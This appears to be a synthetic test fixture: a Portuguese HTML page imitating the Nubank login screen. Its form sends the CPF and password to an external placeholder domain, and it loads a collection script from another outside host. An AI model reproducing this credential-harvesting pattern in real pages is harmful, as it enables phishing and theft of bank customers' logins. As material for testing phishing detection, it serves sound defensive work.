<!doctype html>
<html lang="pt-BR">
  <head>
    <meta charset="utf-8">
    <title>Nubank | Entrar</title>
    <script src="https://cdn.rastreio-exemplo.net/coleta.js"></script>
  </head>
  <body>
    <h1>Entrar na sua conta</h1>
    <!-- Fixture sintético: a ação do formulário aponta para um domínio externo. -->
    <form action="https://painel-exemplo.net/entrar" method="post">
      <input type="text" name="cpf" placeholder="CPF">
      <input type="password" name="senha" placeholder="Senha">
      <button>Continuar</button>
    </form>
  </body>
</html>
